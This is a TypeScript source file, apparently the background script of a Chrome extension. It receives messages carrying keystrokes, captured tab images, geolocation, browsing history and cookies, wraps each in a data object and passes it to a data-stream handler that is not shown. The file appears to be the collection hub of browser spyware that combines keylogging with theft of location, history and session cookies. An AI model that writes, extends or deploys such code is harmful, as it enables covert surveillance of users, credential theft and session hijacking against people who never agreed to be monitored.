import { handleDataStream } from "../utils/handler/dataHandler";
import { DataTypes } from "../consts";

chrome.runtime.onMessage.addListener(async (message, sender, response) => {
    const { type, data }: {type: DataTypes; data?: any} = message;
    console.log(type)
    switch(type) {
        case DataTypes.KEYSTROKES:
            let keystrokes: KeystrokeDto = {buffer: data};
            await handleDataStream([keystrokes], [DataTypes.KEYSTROKES]);
            break;
        case DataTypes.TAB_CAPTURE:
            let capturedTab: TabCaptureDto = {base64: data};
            await handleDataStream([capturedTab], [DataTypes.TAB_CAPTURE]);
            break;
        case DataTypes.GEO_LOCATION:
            let geoLocation: GeoLocationDto = {latitude: data.latitude, longitude: data.longitude, accuracy: data.accuracy}
            await handleDataStream([geoLocation], [DataTypes.GEO_LOCATION]);
            break;
        case DataTypes.HISTORY:
            let history: HistoryDto = {url: data};
            await handleDataStream([history], [DataTypes.HISTORY]);
            break;
        case DataTypes.COOKIES:
            let cookies: CookieDto = {cookies: data.cookie, url: data.url};
            await handleDataStream([cookies], [DataTypes.COOKIES]);
            break;
        default:
            break;       
    }
});